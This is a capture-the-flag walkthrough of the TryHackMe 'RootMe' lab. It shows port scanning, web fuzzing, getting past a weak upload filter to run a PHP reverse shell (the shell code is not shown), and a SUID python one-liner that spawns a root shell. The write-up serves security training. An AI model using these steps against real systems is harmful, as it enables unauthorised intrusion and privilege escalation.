# RootMe
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Reverse Shell 
* Weak Upload Filtering
* SUID

Tools used
--
* nmap
* ffuf
* find
* python

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.74.128
* Other information must be gathered during the attack

Phase 1: Enumeration
--
Let's use Nmap with `-g 53` argument for finding the port 80 as opened:
```
sudo nmap -sS -sC -sV 10.10.74.128 -p- -T5 -vvv

<SNIP>
Initiating SYN Stealth Scan at 00:00
Scanning 10.10.74.128 [65535 ports]
Discovered open port 22/tcp on 10.10.74.128
Discovered open port 80/tcp on 10.10.74.128
<SNIP>
```
Let's try to fuzz the web application:
```
ffuf -u http://10.10.74.128/FFUF -H 'Host: 10.10.74.128' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/2
0100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.
5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/p
ayloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 38ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 38ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 37ms]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 41ms]
:: Progress: [87649/87649] :: Job [1/1] :: 948 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
```
By visiting `/panel` directory, we can see an upload form. On the upload form there is a weak filter. You can upload only reverse shell with the extensions php1, php2, php3, php4, php5, php6, php7, php8, php9.

Once you uploaded a reverse shell, you can call it by visiting:
```
http://10.10.74.128/uploads/rev.php5
```
Get a semi-interactive shell by executing:
```
script /dev/null -c bash
```
The user flag is in the `/var/www/user.txt` file.

Phase 3: Privilege Escalation
--
Let's search for files with SUID permission:
```
find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
The weird file is `/usr/bin/python`. By looking at the https://gtfobins.github.io/gtfobins/python/ link, let's run:
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
We got root privileges:
```
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
```